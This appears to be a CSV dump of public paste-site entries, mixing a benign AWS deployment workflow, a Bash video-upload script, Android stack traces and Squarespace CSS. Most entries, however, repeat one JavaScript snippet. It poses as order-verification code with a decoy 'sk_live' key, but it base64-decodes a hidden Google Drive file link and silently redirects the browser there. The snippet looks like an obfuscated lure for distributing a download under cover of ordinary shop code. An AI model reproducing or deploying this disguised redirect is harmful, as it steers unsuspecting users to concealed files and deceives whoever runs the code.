id,title,username,language,date,content
Rpyad2sj,Market.js,zebmekey,JavaScript,Wednesday 9th of April 2025 12:14:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25218/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ekcb8SeP,CICD,sidjha57,YAML,Wednesday 9th of April 2025 12:08:45 PM CDT,"name: Build, Push to ECR, and Deploy to AWS CloudFormation

on:
  push:
    branches:
      - main # Trigger deployment only on pushes to the main branch

permissions:
  id-token: write # Required for OIDC authentication to AWS
  contents: read  # Required to checkout the repository code
  packages: write # Required if pushing to GH Packages, but we use ECR

env:
  AWS_REGION: ap-south-1                   # Set your AWS region
  ECR_REPOSITORY_NAME: my-app-repo         # CHANGE: Use the ECR repo name (match stack name convention if possible)
  CLOUDFORMATION_STACK_NAME: my-node-app   # CHANGE: Choose a name for your CloudFormation stack

jobs:
  build-and-push-ecr:
    name: Build Docker Image and Push to ECR
    runs-on: ubuntu-latest
    outputs:
      image_tag: ${{ steps.set_image_tag.outputs.tag }}

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure AWS credentials using OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_IAM_ROLE_ARN }} # Use the secret
          aws-region: ${{ env.AWS_REGION }}

      - name: Login to Amazon ECR
        id: login-ecr
        uses: aws-actions/amazon-ecr-login@v2

      - name: Set Image Tag
        id: set_image_tag
        run: echo ""tag=$(echo $GITHUB_SHA | cut -c1-7)"" >> $GITHUB_OUTPUT # Use short Git SHA as tag

      - name: Build, tag, and push image to Amazon ECR
        id: build-image
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
          IMAGE_TAG: ${{ steps.set_image_tag.outputs.tag }}
        run: |
          docker build -t $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:$IMAGE_TAG -t $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:latest .
          docker push $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:$IMAGE_TAG
          docker push $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:latest
          echo ""Pushed image: $ECR_REGISTRY/${{ env.ECR_REPOSITORY_NAME }}:$IMAGE_TAG""

  deploy-cloudformation:
    name: Deploy CloudFormation Stack
    runs-on: ubuntu-latest
    needs: build-and-push-ecr # Run only after build-and-push succeeds

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure AWS credentials using OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_IAM_ROLE_ARN }} # Use the same role or a dedicated deployment role
          aws-region: ${{ env.AWS_REGION }}

      - name: Deploy CloudFormation stack
        uses: aws-actions/aws-cloudformation-github-deploy@v1
        with:
          name: ${{ env.CLOUDFORMATION_STACK_NAME }}
          template: template.yaml # Path to your CloudFormation template
          capabilities: CAPABILITY_IAM, CAPABILITY_NAMED_IAM # Required because we create IAM resources
          parameter-overrides: >- # Pass parameters, crucially the new Docker image tag
            DockerImageTag=${{ needs.build-and-push-ecr.outputs.image_tag }},
            InstanceType=t3.medium,
            DbInstanceClass=db.t3.medium,
            DbUsername=${{ secrets.DB_USERNAME }}, # Store DB credentials securely in GitHub Secrets
            DbPassword=${{ secrets.DB_PASSWORD }},
            SslCertificateArn=${{ secrets.ACM_CERT_ARN }} # Optional: Store ACM ARN in secrets

          # You can add other parameters here if needed, pulling from secrets or env vars

          # Optional: Use change sets for review before execution
          # change-set-name: ${{ env.CLOUDFORMATION_STACK_NAME }}-changeset-${{ github.sha }}
          # wait-for-change-set: true # Waits for changeset creation
          # execute-change-set: true # Executes the change set

          # --- If NOT using change sets (direct deploy) ---
          no-fail-on-empty-changeset: ""1"" # Don't fail if the template/params haven't changed

      - name: Output CloudFormation Stack Outputs
        run: |
          echo ""CloudFormation deployment finished. Stack outputs:""
          aws cloudformation describe-stacks --stack-name ${{ env.CLOUDFORMATION_STACK_NAME }} --query ""Stacks[0].Outputs"" --output table"
4rBcejnW,Untitled,zebmekey,JavaScript,Wednesday 9th of April 2025 11:58:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29548/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ukKZLYv5,Upload a Video for Sharing on Steamable,metalx1000,Bash,Wednesday 9th of April 2025 11:58:19 AM CDT,"#!/bin/bash
######################################################################
#Copyright (C) 2025  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
######################################################################
user=""""
pass=""""
url=""https://api.streamable.com/upload""
file=""$(fzf --prompt=""Select a Video: "")""
[[ $file ]] || exit

id=""$(curl --request POST --url ""$url"" --user $user:$pass --form file=@""$file"" | jq -r '.shortcode')""

echo ""https://streamable.com/${id}""
"
fDCGQnL6,Products.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 11:43:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83911/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4F8jMEZy,Order.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 11:27:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82177/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z2f3eufN,2025-04-09T18:12:56.979080,powerampache,PHP,Wednesday 9th of April 2025 11:12:57 AM CDT,"1.01-79-play (79) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
nVDg66US,Market.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 11:12:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54652/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
c3dqf9RR,Untitled,SpawnKz,JavaScript,Wednesday 9th of April 2025 10:57:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75821/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qhUVC59d,2025-04-09T17:55:54.779568,powerampache,PHP,Wednesday 9th of April 2025 10:55:55 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.15.245.117 (port 49946) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.15.245.117 (port 49946) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.15.245.117 (port 49946) after 15000ms\"" }"",""stackTrace"":[]}"
MbX9SQcc,Rejuv Full back up4/9/25,coffeeandphotos,CSS,Wednesday 9th of April 2025 10:51:34 AM CDT,"//font styles
@font-face{font-family:'Essential Sans';src:url('https://static1.squarespace.com/static/63642c9b83e5a7329c53abd4/t/67f0a658a6109c31d213f0e2/1743824472975/EssentialSans-Bold.woff')format('woff');font-weight:normal;}:root{--heading-font-font-family:'Essential Sans';}

@font-face{font-family:'Essential';src:url('https://static1.squarespace.com/static/63642c9b83e5a7329c53abd4/t/67f0a1982e773144c7dd8fda/1743823256558/EssentialSans-Medium.woff')format('woff');font-weight:normal;}:root{--body-font-font-family:'Essential';}


//Don't Display Portfolio Pagination
.item-pagination--prev-next {
display: none;}
 
/* Change dropdown menu background */
.header-nav-folder-content {
background: #BEBCE6 !important;
}
 
//header nav menu mobile
 
.header-menu-nav-item a {
font-size: 1.9rem;}
 
//remove underline from links
a {
text-decoration: none !important;
}
header a {
background-image: none !important;
}
footer a {
text-decoration: none !important;
}
 
//hide BACK arrow in mobile menu
.header-menu-controls-control span:nth-of-type(2) {
display: none;
}
 
// logo gallery marquee homepage
 
@keyframes moveLeft {
0% {
transform: translateX(0%);
}
 
100% {
transform: translateX(-300%);
}
}
//main css
section[data-section-id=""63c35bb9b98b7f0d1d647b8d""] {
overflow:hidden;
border-bottom:1px solid;
 
.gallery-grid-item-wrapper img  {
object-fit:contain !important;
}
 
.gallery-grid-wrapper {
display:flex !important;
animation:  moveLeft 65s linear      infinite;
.gallery-grid-item {
min-width:15%;
margin-right:5%;
}
}
 
.gallery-grid-item:not([data-show]) .gallery-grid-item-wrapper {
opacity: 1;
 
}
.gallery-grid-item:not([data-show]) .gallery-grid-item-caption {
opacity: 1;
visibility: visible !important;
}
 
.gallery-grid[data-show-captions=""false""] .gallery-grid-item-caption {
display: none
}
 
.gallery-grid[data-show-captions=""true""][data-animation=""none""] .gallery-grid-item-caption {
transition: none
}
 
}
 
//mobile
 
section[data-section-id=""63c35bb9b98b7f0d1d647b8d""] {
 
@media screen and (max-width:767px) {
.gallery-grid-item {
min-width:50% !important;
margin-right:5%;
}
 
}
 
.gallery  {
min-height:initial !important;
}
 
}
//end of gallery marque
 
//list image radius
 
.user-items-list-simple .list-image
{border-radius:40px;}
 
//-- testimonial carosel list shape/radius
.list-item[data-is-card-enabled=""true""] {border-radius:40px}
 
//blog image style radius
.blog-basic-grid .image-wrapper img {
border-radius: 40px;}
 
//gallery slideshow container radius homepage
section[data-section-id=""663e8090bd16811e3c5ee9b6""]
.sqs-gallery-block-slideshow .sqs-gallery-design-stacked-slide {border-radius:40px;}
//
.sqs-gallery-block-slideshow {
background-color: transparent}
//
//mega menu
.mega {
position: absolute;
width: 100%;
opacity: 0;
left: 0;
bottom: 0px;
visibility: hidden;
pointer-events: none;
transition:transform 1s ease;
transform: translate(0,95%);
 
&:after {
position: absolute;
left: 0;
content: '';
height: 100%;
width: 100%;
z-index: -1;
background: transparent;
top: 5px;
transform: translate(0,-100%);
 
}
 
}
 
.mega:hover {
opacity: 1;
visibility: visible;
pointer-events: auto!important;
-webkit-transition-delay: 0s;
-o-transition-delay: 0s;
transition-delay: 0s;
transform: translate(0,100%);
& * {
pointer-events: auto;
}
}
.folder a {
pointer-events:none;
}
.folder:hover {
& + .mega {
opacity: 1;
pointer-events: auto!important;
visibility: visible;
transform: translate(0,100%);
}
}
 
@media (min-width:991px) {
 
.folder {
z-index:99999 !important;
.header-nav-folder-content {
display: none;
}
}
.header-nav-item,
.header-title,
.header-actions {
z-index: 9;
position: relative !important;
}
.header-background,.header::before,
{
pointer-events: none!important;
}
 
.header-display,
.header-inner {
position: static!important;
}
 
}
 
//LEFT ALIGN TEXT
.mega {
p,h2,h3,h1 {
text-align:left;
}
//remove underlines in links
p a {
border-bottom:0px !important;
}
}
 
.section-background-content img {
visibility:visible !important;
}
 
//background color
//Mega Menu Background color
.mega {
 
.section-background {
background-color: #EBEAEB !important;
}
 
}
//padding
.mega {
.content-wrapper {
padding-top: 5vh !important;
padding-bottom: 5vh !important;
}
}
//typography
.mega {
h3 {
font-size:18px;
font-family: Poppins;
}
h1,h2,h3,h4, p {
text-align:left;
line-height: 1.8;
}
 
}
 
//mobile mega menu
//Hide Default Nav Items
//hide popout menu on mobile, most tablets
@media only screen and (max-width: 1024px) and (pointer: coarse), screen and (max-width: 799px) {
.header-menu-nav-list {
display:none;
}
 
}
 
//basic mobile
 
.header--menu-open .header-menu {
overflow-y:scroll;
background-color:#EBEAEB; //change as needed
.header-menu-bg{
display:none;
}
 
//Fix Background Color
.page-section {
background-color:transparent !important;
 
min-height:initial !important;
}
 
.section-background {
background-color: transparent !important;
}
 
//Define Padding
.content-wrapper {
padding-top:0px  !important;
padding-bottom:0px !important;
}
//Adjust Block Spacing
.sqs-block {
padding-top:10px;
padding-bottom:10px;
}
 
}
 
body:not(.header--menu-open) {
#mobileNav {
opacity:0;
}
}
 
.header--menu-open {
#mobileNav {
opacity:1;
}
}
 
//fix button mobile nav
[data-section-id=""67183b1fd77927170e45465d""] .sqs-button-element--primary {color: #fff !important}

#block-672195f140a26602472e .sqs-button-element--tertiary {color: #fff !important}
 
//mobile menu page font style
[data-section-id=""63cf36ffbc1f0240b2998d16""] H3 { line-height: 1.8 !important;
}
[data-section-id=""63cf3617e216dc3d3b12e29d""] H3 { line-height: 1.8 !important;
}
 
//gallery radius + instagram block radius
.slide .sqs-video-overlay {border-radius: 40px !important;}
 
//gallery radius + instagram block radius
.sqs-gallery-block-grid .slide .margin-wrapper a.image-slide-anchor {border-radius: 40px !important;}"
UdUby1ZT,2025-04-09T11:44:45.322392,powerampache,PHP,Wednesday 9th of April 2025 10:44:46 AM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 Not Found
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

authorize() - cannot load data HttpException {""code"":404,""message"":""Not Found"",""detailMessage"":""HTTP 404 Not Found"",""stackTrace"":[]}"
cv9cCZT5,2025-04-09T11:44:21.163433,powerampache,PHP,Wednesday 9th of April 2025 10:44:22 AM CDT,"1.01-79-play (79) - DB: 83
java.time.format.DateTimeParseException: Text '0' could not be parsed at index 0
	at java.time.format.DateTimeFormatter.parseResolved0(DateTimeFormatter.java:2050)
	at java.time.format.DateTimeFormatter.parse(DateTimeFormatter.java:1952)
	at java.time.LocalDateTime.parse(LocalDateTime.java:487)
	at luci.sixsixsix.powerampache2.data.mapping.AmpacheDateMapper.isoStringToLocalDateTime(AmpacheDateMapper.kt:43)
	at luci.sixsixsix.powerampache2.domain.mappers.DateMapper$DefaultImpls.invoke(DateMapper.kt:28)
	at luci.sixsixsix.powerampache2.data.mapping.AmpacheDateMapper.invoke(AmpacheDateMapper.kt:29)
	at luci.sixsixsix.powerampache2.data.remote.dto.AuthDtoKt.toSession(AuthDto.kt:111)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.tryAuthorize(MusicRepositoryImpl.kt:271)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.access$tryAuthorize(MusicRepositoryImpl.kt:83)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$tryAuthorize$1.invokeSuspend(Unknown Source:18)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:1000)
	at android.os.Handler.dispatchMessage(Handler.java:104)
	at android.os.Looper.loopOnce(Looper.java:242)
	at android.os.Looper.loop(Looper.java:362)
	at android.app.ActivityThread.main(ActivityThread.java:8448)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:552)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:992)

authorize() - generic exception {""detailMessage"":""Text \u00270\u0027 could not be parsed at index 0"",""stackTrace"":[]}"
f6rrZ6aw,Products.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 10:41:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10296/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qjk7GTKc,Order.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 10:26:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k0GrW0CF,Market.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 10:11:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56196/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7hkgsgZz,Untitled,SpawnKz,JavaScript,Wednesday 9th of April 2025 09:55:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08307/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
